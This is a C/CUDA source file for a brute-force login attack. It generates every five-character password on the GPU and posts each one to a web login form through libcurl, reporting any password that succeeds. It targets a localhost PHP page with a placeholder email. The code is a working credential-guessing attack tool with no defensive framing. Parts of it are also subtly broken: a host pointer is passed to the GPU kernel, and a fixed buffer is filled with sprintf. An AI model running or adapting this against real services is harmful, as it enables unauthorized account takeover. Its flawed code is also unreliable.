#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <cuda_runtime.h>
#include <math.h> // Include for pow function

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realSize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = (char *)realloc(mem->memory, mem->size + realSize + 1); // +1 for null terminator
    if(ptr == NULL) {
        fprintf(stderr, "not enough memory (realloc returned NULL)\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realSize);
    mem->size += realSize;
    mem->memory[mem->size] = '\0'; // Null-terminate the buffer
    return realSize;
}

CURL *curl_init_session() {
    CURL *curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, ""); // Enable cookie handling
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow HTTP redirects
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    }
    return curl;
}

int attempt_login(CURL *curl, const char *url, const char *email, char *password) {
    struct MemoryStruct chunk;
    chunk.memory = (char *)malloc(1); // initially allocate 1 byte, explicitly cast
    chunk.size = 0;

    char postfields[256];
    sprintf(postfields, "signIn=true&email=%s&password=%s", email, password);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    CURLcode res = curl_easy_perform(curl);

    int success = 0;
    if(res == CURLE_OK) {
        if(strstr(chunk.memory, "success")) {
            printf("Password found: %s\n", password);
            success = 1;
        } else {
            printf("Login failed for password: %s. Server response was: %s\n", password, chunk.memory);
        }
    } else {
        fprintf(stderr, "CURL request failed for password '%s': %s\n", password, curl_easy_strerror(res));
    }

    free(chunk.memory);
    return success;
}

__global__ void generatePasswords(char *chars, int numChars, char *allPasswords, int totalPasswords) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if(idx < totalPasswords) {
        int n = numChars;
        int localIdx = idx;
        allPasswords[idx * 6 + 5] = '\0';  // Ensure null termination for each password
        for(int i = 4; i >= 0; i--) {
            allPasswords[idx * 6 + i] = chars[localIdx % n];
            localIdx /= n;
        }
    }
}

void generatePasswordsAndTest(CURL *curl, const char *url, const char *email, char *chars, int numChars) {
    int totalPasswords = pow(numChars, 5);  // Assume 5-character passwords
    size_t sizeOfAllPasswords = totalPasswords * 6 * sizeof(char);  // 6 includes the null terminator
    char *allPasswordsHost = (char *)malloc(sizeOfAllPasswords);
    char *allPasswordsDevice;

    cudaMalloc((void **)&allPasswordsDevice, sizeOfAllPasswords);
    cudaMemcpy(allPasswordsDevice, allPasswordsHost, sizeOfAllPasswords, cudaMemcpyHostToDevice);

    int threadsPerBlock = 256;
    int blocksPerGrid = (totalPasswords + threadsPerBlock - 1) / threadsPerBlock;

    generatePasswords<<<blocksPerGrid, threadsPerBlock>>>(chars, numChars, allPasswordsDevice, totalPasswords);

    cudaMemcpy(allPasswordsHost, allPasswordsDevice, sizeOfAllPasswords, cudaMemcpyDeviceToHost);

    for(int i = 0; i < totalPasswords; i++) {
        if(attempt_login(curl, url, email, &allPasswordsHost[i * 6])) {
            printf("Password found: %s\n", &allPasswordsHost[i * 6]);
            break;
        }
    }

    free(allPasswordsHost);
    cudaFree(allPasswordsDevice);
}

int main(void) {
    const char *email = "a@gmail.com"; // The email to test
    const char *url = "http://localhost/login/register.php"; // URL to the PHP script for login
    char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=[]{}|;:,.<>?";
    int numChars = strlen(chars);

    CURL *curl = curl_init_session();
    if(curl) {
        generatePasswordsAndTest(curl, url, email, chars, numChars);
        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "CURL initialization failed\n");
    }
    curl_global_cleanup();
    return 0;
}
